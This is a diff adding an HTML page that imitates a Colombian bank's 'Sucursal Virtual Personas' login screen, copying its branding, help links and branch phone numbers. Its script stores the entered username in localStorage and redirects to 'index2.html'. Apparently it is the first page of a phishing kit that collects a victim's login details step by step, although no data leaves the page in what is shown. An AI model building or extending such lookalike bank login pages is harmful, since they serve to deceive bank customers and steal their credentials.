@@ -1,0 +1,172 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3c.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <title>Sucursal Virtual Personas</title>
+    <meta content="es" http-equiv="Content-Language" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+
+    <link href="css/styles.css" media="all" rel="stylesheet" type="text/css" />
+    <link
+      href="css/bootstrap.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link
+      href="css/jquery-ui.css"
+      media="all"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link href="css/ui.css" media="all" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="img/favicon.ico" />
+
+    <style>
+      .loaderp-full {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.8);
+        justify-content: center;
+        align-items: center;
+      }
+      .spinner {
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        border-left-color: #000;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container" id="containerMain">
+      <div id="header" class="mua-page-header">
+        <div class="row row-logo-svp">
+          <div class="col-xs-12 col-sm-7 col-md-7 left-div">
+            <div class="mua-imgLogoItem"></div>
+            <div class="text-svp-name">Sucursal Virtual Personas</div>
+          </div>
+        </div>
+      </div>
+      <div class="panel-heading">
+        <h3>Inicio de sesión</h3>
+      </div>
+      <div class="panel panel-primary">
+        <div class="mua-panel-body">
+          <div class="row">
+            <div class="col-xs-12 col-sm-5 col-md-4">
+              <div class="panel_general mua-panel_general">
+                <div class="title-panel-label">
+                  <h1>Usuario</h1>
+                </div>
+                <div class="subtitle-land-label">
+                  <h4>
+                    Si no tienes un usuario asignado ingresa con tu documento de
+                    identidad
+                  </h4>
+                </div>
+                <div id="contenido">
+                  <div class="mua-content-group-panel">
+                    <label class="control-label-index" for="username"
+                      >Ingresa tu usuario</label
+                    >
+                    <input
+                      id="username"
+                      name="username"
+                      class="mua-form-control"
+                      type="text"
+                      maxlength="20"
+                      autocomplete="off"
+                      required
+                    />
+                  </div>
+                </div>
+                <div class="one-button-container mua-button-container">
+                  <button
+                    onclick="window.location.href='index2.html'"
+                    id="autorizarBtn"
+                    class="btn btn-success"
+                    type="submit"
+                  >
+                    Continuar
+                  </button>
+                  <div class="loaderp-full" id="loader">
+                    <div class="spinner"></div>
+                  </div>
+                </div>
+                <div class="mua-panel_enlances">
+                  <p><a href="#">¿Olvidaste tu usuario?</a></p>
+                  <p><a href="#">¿Problemas para conectarte?</a></p>
+                </div>
+              </div>
+            </div>
+            <div class="col-xs-12 col-sm-7 col-md-8">
+              <div class="mua-embed-container-personal" id="banner-persona">
+                <iframe
+                  class="mua-iframe"
+                  src="login_SVP_BC_zonaA.html"
+                  frameborder="0"
+                  scrolling="no"
+                  width="635px"
+                  height="335px"
+                ></iframe>
+              </div>
+              <p class="text-center">
+                ¿No conoces la Sucursal Virtual Personas?
+                <a href="#" class="a1">Conoce más aquí</a>
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-xs-12 col-sm-12 col-md-12">
+          <p class="mua-footer">
+            Sucursal Telefonica: Bogota (57) 60 1 343 00 00 - Medellín (57) 60 4
+            510 90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88
+            88 - Cartagena (57) 60 5 693 44 00 - <br />
+            Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El
+            resto del país 018000 9 12345.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const input = document.getElementById("username");
+        const button = document.getElementById("autorizarBtn");
+
+        if (input && button) {
+          // Recuperar y rellenar el input con el valor almacenado
+          const storedUsername = localStorage.getItem("username");
+          if (storedUsername) {
+            input.value = storedUsername;
+          }
+
+          // Guardar en localStorage al hacer clic en el botón
+          button.addEventListener("click", function () {
+            localStorage.setItem("username", input.value);
+            console.log("Guardado en localStorage:", input.value);
+            window.location.href = "index2.html"; // Redirigir a index2.html
+          });
+        } else {
+          console.error("No se encontró el input o el botón.");
+        }
+      });
+    </script>
+  </body>
+</html>
